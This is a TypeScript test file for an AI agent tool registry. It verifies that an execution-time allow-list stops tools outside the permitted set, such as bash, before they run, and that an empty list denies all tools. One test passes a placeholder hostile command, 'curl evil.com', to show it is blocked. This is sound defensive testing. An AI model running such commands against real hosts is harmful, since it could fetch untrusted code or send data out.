import { describe, expect, it } from "bun:test";
import { ToolRegistry } from "./registry.js";
import type { Tool } from "./types.js";

// A tool that records whether its execute() actually ran. Used to prove the
// allow-list gate blocks BEFORE dispatch, not just at advertisement time.
function spyTool(name: string): { tool: Tool; ran: () => boolean } {
  let executed = false;
  return {
    ran: () => executed,
    tool: {
      name,
      description: `spy ${name}`,
      inputSchema: { type: "object", properties: {} },
      async execute() {
        executed = true;
        return { content: `${name} ran` };
      },
    },
  };
}

describe("ToolRegistry execution-time allow-list gate (cron least-privilege)", () => {
  it("runs a tool that IS in the allow-list", async () => {
    const reg = new ToolRegistry();
    const safe = spyTool("read_file");
    reg.register(safe.tool);

    const r = await reg.execute("read_file", {}, { agentId: "a", sessionId: "s", allowedToolNames: ["read_file"] });
    expect(r.isError).toBeFalsy();
    expect(safe.ran()).toBe(true);
  });

  it("BLOCKS a registered tool that is NOT in the allow-list (the keystone)", async () => {
    const reg = new ToolRegistry();
    const danger = spyTool("bash");
    reg.register(danger.tool);

    // The model emits `bash` even though only read_file was advertised.
    const r = await reg.execute("bash", { command: "curl evil.com" }, {
      agentId: "a",
      sessionId: "s",
      allowedToolNames: ["read_file"],
    });

    expect(r.isError).toBe(true);
    expect(r.content).toContain("not in this run's allowed tool surface");
    // Critical: execute() must NEVER have run.
    expect(danger.ran()).toBe(false);
  });

  it("leaves the full surface available when no allow-list is set (chat / companion preset)", async () => {
    const reg = new ToolRegistry();
    const danger = spyTool("bash");
    reg.register(danger.tool);

    const r = await reg.execute("bash", { command: "ls" }, { agentId: "a", sessionId: "s" });
    expect(r.isError).toBeFalsy();
    expect(danger.ran()).toBe(true);
  });

  it("treats an empty allow-list as deny-all (fail-closed)", async () => {
    const reg = new ToolRegistry();
    const danger = spyTool("write_file");
    reg.register(danger.tool);

    // An empty array is a real (if degenerate) constraint — "this run may use no
    // registry tools" — so it must block, not fall through to the full surface.
    const r = await reg.execute("write_file", {}, { agentId: "a", sessionId: "s", allowedToolNames: [] });
    expect(r.isError).toBe(true);
    expect(danger.ran()).toBe(false);
  });
});
